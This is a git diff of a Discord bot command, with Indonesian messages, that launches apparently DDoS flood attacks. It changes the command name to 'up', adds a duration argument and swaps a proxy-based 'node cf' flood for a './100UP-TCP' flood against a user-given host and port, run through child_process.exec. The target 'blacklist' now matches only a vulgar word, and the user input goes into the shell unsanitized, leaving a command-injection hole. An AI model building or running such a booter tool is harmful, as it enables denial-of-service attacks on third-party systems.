@@ -7,7 +7,8 @@ exports.run = async (client, message, args) => {
 
 const host = message.content.split (" ")[1]
 const port = message.content.split (" ")[2]
-const api = message.content.split (" ")[3]
+const time = message.content.split (" ")[3]
+const api = message.content.split (" ")[4]
 const ayarlar = require('../ayarlar.json');
 var room = ayarlar.commandroom;
 
@@ -32,14 +33,14 @@ if(!args[0]) {
 	const embed1 = new Discord.MessageEmbed()
 	.setColor('RANDOM')
 	.setTitle('WARRING')
-	.setDescription("`contoh ;punchwibu target time api`")
+	.setDescription("`contoh ;up target port time api`")
 	.setFooter("GUNAKAN DENGAN BIJAK OKH!!!")
 	message.channel.send(embed1);
 	return;
 	}
 
 //BLACKLISTING SYSTEM 
- if (args[1] === "IP") {
+ if (args[1] === "kontol") {
   message.channel.send(Warn("TARGET IS BLACKLISTED!"));
   return;
 }
@@ -55,11 +56,11 @@ if(!args[0]) {
     message.channel.send(Warn("time cannot contain characters!"));
     return;
   }
-  if (isLetter(port)) {
+  if (isLetter(time)) {
     message.channel.send(Warn("Time cannot contain characters!"));
     return;
   }
-  if (Number(port) > ayarlar.maxtime) {
+  if (Number(time) > ayarlar.maxtime) {
     message.channel.send(Warn("🚫 Max time is " + ayarlar.maxtime + " seconds! 🚫"));
     return;
   }
@@ -68,7 +69,7 @@ if(!args[0]) {
 
 // Command attack
 var exec = require('child_process').exec
-exec(`node cf ${host} ${port} 100 GET proxy.txt 200`, (error, stdout, stderr) => {
+exec(`./100UP-TCP GET ${host} ${port} ${time} 7000`, (error, stdout, stderr) => {
 });
 
 // Start Attacking
@@ -113,12 +114,12 @@ const embed = new Discord.MessageEmbed()
 exports.conf = {
   enabled: true,
   guildOnly: false,
-  aliases: ['punchwibu'],
+  aliases: ['up'],
   permLevel: 0
 }
 
 exports.help = {
-  name: 'punchwibu',
+  name: 'up',
   description: 'YUKAI',
-  usage: 'punchwibu'
+  usage: 'up'
 }
